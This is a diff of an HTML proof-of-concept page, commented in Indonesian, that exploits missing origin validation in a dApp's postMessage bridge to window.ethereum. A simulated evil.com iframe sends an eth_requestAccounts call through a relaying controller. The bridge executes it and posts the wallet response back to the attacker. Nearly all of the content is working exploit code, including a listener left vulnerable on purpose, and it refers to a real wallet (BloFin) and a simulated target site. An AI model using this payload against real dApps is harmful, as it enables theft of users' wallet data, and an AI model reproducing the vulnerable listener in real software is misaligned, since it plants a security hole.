@@ -2,102 +2,129 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PostMessage & window.ethereum Hijack PoC (All-in-One)</title>
+    <title>Real PoC: PostMessage to window.ethereum Provider Hijack</title>
     <style>
-        body { font-family: monospace; background: #121212; color: #00ffcc; padding: 20px; }
-        .container { display: flex; gap: 20px; }
-        .box { flex: 1; border: 1px solid #444; background: #1e1e1e; padding: 10px; }
-        iframe { width: 100%; height: 200px; border: 1px solid #333; background: #000; }
-        #logArea { display: block; white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #333; margin-top: 10px; max-height: 150px; overflow-y: auto; color: #ff5555; }
+        body { font-family: monospace; background: #0d1117; color: #58a6ff; padding: 20px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 6px; }
+        iframe { width: 100%; height: 250px; border: 1px solid #30363d; background: #000; border-radius: 4px; }
+        #log { background: #010409; color: #7ee787; padding: 15px; border: 1px solid #30363d; border-radius: 6px; margin-top: 20px; white-space: pre-wrap; max-height: 250px; overflow-y: auto; }
+        h3 { margin-top: 0; color: #f0f6fc; }
     </style>
 </head>
 <body>
 
-    <h2>[PoC] PostMessage to window.ethereum Provider Hijack</h2>
-    <p>Target: Testing missing origin validation on provider bridge.</p>
+    <h2>[Real Exploit PoC] PostMessage & window.ethereum Hijack</h2>
+    <p>Menguji celah <i>Missing Origin Validation</i> pada jembatan postMessage dApp yang meneruskan eksekusi ke provider asli (`window.ethereum`).</p>
 
-    <div class="container">
-        <!-- Iframe A: Target Context (Simulasi 0x403for.github.io) -->
-        <div class="box">
-            <h3>Iframe A (Target dApp)</h3>
-            <iframe id="iframeA" srcdoc='
-                <h4>Target Context</h4>
-                <p id="status">Status: Waiting for postMessage...</p>
-                <script>
-                    window.addEventListener("message", async function(event) {
-                        // VULNERABILITY: Tidak ada validasi event.origin yang ketat
-                        const data = event.data;
-                        if (data && data.type === "WEB3_REQUEST") {
-                            document.getElementById("status").innerText = "Processing request from: " + event.origin;
+    <div class="grid">
+        <!-- Iframe A: Target dApp (Misal: Halaman dApp sah yang memiliki script bridge rentan) -->
+        <div class="card">
+            <h3>Iframe A: Target dApp Context</h3>
+            <p style="font-size: 12px; color: #8b949e;">Menyimulasikan dApp yang memiliki akses ke `window.ethereum` asli.</p>
+            <iframe id="targetDApp" srcdoc='
+                <!DOCTYPE html>
+                <html>
+                <head><title>Target dApp</title></head>
+                <body style="background:#0d1117; color:#c9d1d9; font-family:monospace; font-size:12px;">
+                    <h4>Target dApp Bridge Active</h4>
+                    <p id="st">Waiting for cross-origin postMessage...</p>
+                    <script>
+                        // Listener rentan tanpa validasi event.origin yang aman
+                        window.addEventListener("message", async (event) => {
+                            const data = event.data;
                             
-                            // Simulasi interaksi window.ethereum / BloFin
-                            let response;
-                            if (window.ethereum) {
-                                response = await window.ethereum.request({ method: data.method, params: data.params });
-                            } else {
-                                response = ["0xMockedBloFinWalletAddress12345"]; // Fallback mock
+                            // ⚠️ KERENTANAN: Menerima payload dari sembarang origin (misalnya * atau tidak dicek whitelist)
+                            if (data && data.action === "EXECUTE_WEB3_CALL") {
+                                document.getElementById("st").innerText = "Received request from origin: " + event.origin;
+                                
+                                try {
+                                    if (typeof window.ethereum !== "undefined") {
+                                        // Memanggil provider asli (misal: BloFin / ekstensi web3 aktif)
+                                        const res = await window.ethereum.request({
+                                            method: data.method,
+                                            params: data.params || []
+                                        });
+                                        
+                                        // Mengirim balik data sensitif ke origin pemanggil (bisa dicuri attacker)
+                                        event.source.postMessage({
+                                            status: "SUCCESS",
+                                            origin: location.origin,
+                                            result: res
+                                        }, event.origin);
+                                    } else {
+                                        event.source.postMessage({
+                                            status: "ERROR",
+                                            message: "window.ethereum not found in target context"
+                                        }, event.origin);
+                                    }
+                                } catch (err) {
+                                    event.source.postMessage({
+                                        status: "ERROR",
+                                        message: err.message
+                                    }, event.origin);
+                                }
                             }
-
-                            // Mengirim balik response ke origin pengirim (bisa dicuri evil.com)
-                            event.source.postMessage({
-                                status: "SUCCESS",
-                                result: response
-                            }, event.origin);
-                        }
-                    });
-                </script>
+                        });
+                    </script>
+                </body>
+                </html>
             '></iframe>
         </div>
 
-        <!-- Iframe B: Attacker Context (Simulasi evil.com) -->
-        <div class="box">
-            <h3>Iframe B (Attacker / evil.com)</h3>
-            <iframe id="iframeB" srcdoc='
-                <h4>Attacker Context</h4>
-                <p id="atk-status">Status: Ready to attack...</p>
-                <script>
-                    // Menyerang Iframe A atau induk dengan memanfaatkan celah postMessage
-                    setTimeout(() => {
-                        document.getElementById("atk-status").innerText = "Sending malicious postMessage to target...";
-                        // Mencari window target (parent atau iframe lain)
-                        window.parent.postMessage({
-                            target: "iframeA",
-                            type: "WEB3_REQUEST",
-                            method: "eth_requestAccounts",
-                            params: []
-                        }, "*");
-                    }, 2000);
-                </script>
+        <!-- Iframe B: Attacker (Misal: evil.com) -->
+        <div class="card">
+            <h3>Iframe B: Attacker (evil.com)</h3>
+            <p style="font-size: 12px; color: #8b949e;">Menyimulasikan website jahat yang mengeksploitasi postMessage dApp.</p>
+            <iframe id="attackerContext" srcdoc='
+                <!DOCTYPE html>
+                <html>
+                <head><title>Attacker Site</title></head>
+                <body style="background:#1f1313; color:#ff7b72; font-family:monospace; font-size:12px;">
+                    <h4>Malicious Context (evil.com)</h4>
+                    <p id="atk-st">Initializing exploit payload...</p>
+                    <script>
+                        setTimeout(() => {
+                            document.getElementById("atk-st").innerText = "Sending malicious postMessage to target dApp...";
+                            
+                            // Menargetkan iframe dApp (atau window utama yang rentan)
+                            // Memaksa dApp mengeksekusi method sensitive seperti eth_requestAccounts
+                            window.parent.postMessage({
+                                action: "EXECUTE_WEB3_CALL",
+                                method: "eth_requestAccounts",
+                                params: []
+                            }, "*");
+                        }, 2000);
+                    </script>
+                </body>
+                </html>
             '></iframe>
         </div>
     </div>
 
-    <h3>Execution Log (Controller):</h3>
-    <div id="logArea"></div>
+    <h3>Live Execution & Response Log:</h3>
+    <div id="log">[*] Initializing controller monitor...\n</div>
 
     <script>
-        function log(msg) {
-            const d = document.getElementById('logArea');
-            d.innerHTML += `[+] ${msg}\n`;
-            d.scrollTop = d.scrollHeight;
+        const logBox = document.getElementById('log');
+
+        function appendLog(text) {
+            logBox.innerText += text + "\n";
+            logBox.scrollTop = logBox.scrollHeight;
         }
 
-        window.addEventListener('message', function(event) {
-            log(`Controller intercepted message from origin [${event.origin}]:`);
-            log(JSON.stringify(event.data, null, 2));
+        // Controller memantau aliran pesan lintas iframe untuk membuktikan pencurian data/respons
+        window.addEventListener('message', (event) => {
+            appendLog(`[+] Intercepted message from origin: ${event.origin}`);
+            appendLog(`[+] Payload data: ${JSON.stringify(event.data, null, 2)}`);
 
-            // Jika Iframe B meminta controller meneruskan payload ke Iframe A (Cross-Frame Attack Simulation)
-            if (event.data && event.data.type === 'WEB3_REQUEST') {
-                log("Relaying malicious request to Iframe A...");
-                const frameA = document.getElementById('iframeA').contentWindow;
-                frameA.postMessage(event.data, '*');
+            // Jika pesan berasal dari Attacker/iframe B atau diteruskan, arahkan ke target dApp
+            if (event.data && event.data.action === "EXECUTE_WEB3_CALL") {
+                appendLog("[!] Relaying attacker payload to Target dApp iframe...");
+                const targetFrame = document.getElementById('targetDApp').contentWindow;
+                targetFrame.postMessage(event.data, '*');
             }
         });
-
-        setTimeout(() => {
-            log("PoC Environment Initialized. Monitoring message flows...");
-        }, 1000);
     </script>
-
 </body>
 </html>
